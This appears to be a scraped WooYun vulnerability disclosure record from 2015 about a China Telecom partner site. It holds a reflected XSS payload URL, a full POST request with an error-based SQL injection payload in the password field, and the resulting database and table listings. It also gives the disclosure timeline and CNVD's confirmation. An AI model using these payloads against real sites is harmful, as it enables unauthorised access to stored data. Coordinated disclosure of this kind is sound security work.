{"id": 70106, "wybug_id": "wooyun-2015-0135897", "wybug_title": "中国电信某站存在SQL漏洞", "wybug_corp": "中国电信", "wybug_author": "霝z", "wybug_date": "2015-08-23 17:25", "wybug_open_date": "2015-10-09 19:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-25：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-09-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-09：\t细节向公众公开  简要描述： 本来是想查一个厂家的商品防伪系统，然后发现了电信的某个站。。居然存在XSS——这是小问题，但之后，再发现存在SQL注入漏洞。。 详细说明：  info：11895企业综合信息服务中心是北京风行盛世数码科技有限公司与中国电信股份有限公司合作推出的唯一通过中国电信118智能声讯网为企业提供综合信息服务的服务平台。**.**.**.**第一步，查找漏洞：1、有XSS：\nhttp://**.**.**.**/fwmcx/index.asp?fwm=>\"'><img%20src=\"javascript.:alert('XSS')\">script>alert('hello，gaga!');</script>\n\n\n2、存在SQL注入：\nPOST /361/checkid.asp HTTP/1.1Cache-Control: no-cacheReferer: http://**.**.**.**/361/Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Netsparker)Accept-Language: en-us,en;q=0.5X-Scanner: NetsparkerHost: **.**.**.**Cookie: ASPSESSIONIDAQTRSBCC=LFGECLLAEPOPEEJIGHMNCHHP; buyok%5Fuser%5Fip=218%2E107%2E1%2E124Accept-Encoding: gzip, deflateContent-Length: 535Content-Type: application/x-www-form-urlencodedadminid=%ef%bf%bd%d6%bb%ef%bf%bd%ef%bf%bd%ef%bf%bd%2f%ef%bf%bd%d6%bb%ef%bf%bd%ef%bf%bd%ef%bf%bd(%ef%bf%bd%c7%b1%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%c3%bb%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%da%ba%ef%bf%bd%ef%bf%bd%ef%bf%bd%c7%b0%ef%bf%bd%ef%bf%bd0)&password=-1%27+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27\n看到有11个database：\n\n挑个最简单的，看看里面有啥：\nDatabase: sms[3 tables]+---------+| sms     || smsdic  || smsrecv |+---------+Database: smsTable: sms[10 columns]+------------+---------------+| Column     | Type          |+------------+---------------+| CellNumber | varchar(20)   || CreateTime | timestamp     || HandleTime | datetime      || Priority   | int(4)        || RetryCount | smallint(6)   || SendTime   | timestamp     || SMSContent | varchar(5000) || Status     | smallint(2)   || SysNo      | int(4)        || ToCom      | int(4)        |+------------+---------------+\n好吧，不是什么重要的东西好像，再看看其他：\n\n\n\n囧，不知道是什么呀~~好吧，脱裤是一种无聊的事，重不重要由“他们”说吧~   漏洞证明：  \nDatabase: sms[3 tables]+---------+| sms     || smsdic  || smsrecv |+---------+Database: smsTable: sms[10 columns]+------------+---------------+| Column     | Type          |+------------+---------------+| CellNumber | varchar(20)   || CreateTime | timestamp     || HandleTime | datetime      || Priority   | int(4)        || RetryCount | smallint(6)   || SendTime   | timestamp     || SMSContent | varchar(5000) || Status     | smallint(2)   || SysNo      | int(4)        || ToCom      | int(4)        |+------------+---------------+\n\n\n   修复方案：  过滤特殊字符   版权声明：转载请注明来源 霝z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-08-25 19:11 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向中国电信集团公司通报,由其后续协调网站管理部门处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}